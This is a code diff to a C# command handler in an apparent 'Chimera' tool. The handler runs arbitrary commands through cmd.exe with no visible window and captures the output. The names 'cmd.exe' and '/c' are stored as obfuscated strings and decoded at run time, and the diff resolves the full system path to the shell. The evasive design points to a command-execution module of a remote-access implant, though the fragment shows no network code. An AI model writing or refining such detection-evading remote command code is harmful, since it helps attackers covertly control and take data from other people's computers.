@@ -12,21 +12,18 @@ namespace Chimera.Commands
                 if (string.IsNullOrEmpty(command))
                     return "No command specified";
 
+                string sysDir  = Environment.GetFolderPath(Environment.SpecialFolder.System);
+                string cmdPath = System.IO.Path.Combine(sysDir, StringHelper.Decode(StringHelper.CMD));
+
                 var psi = new ProcessStartInfo
                 {
-                    // Use obfuscated strings for cmd.exe and /c
-                    FileName  = StringHelper.Decode(StringHelper.CMD),
+                    FileName  = cmdPath,
                     Arguments = StringHelper.Decode(StringHelper.SLASH_C) + " " + command,
-
-                    // Capture output
                     RedirectStandardOutput = true,
                     RedirectStandardError  = true,
                     UseShellExecute        = false,
                     CreateNoWindow         = true,
-
-                    // Run in system32 dir to avoid path issues
-                    WorkingDirectory = Environment.GetFolderPath(
-                        Environment.SpecialFolder.System)
+                    WorkingDirectory       = sysDir
                 };
 
                 using (var proc = Process.Start(psi))
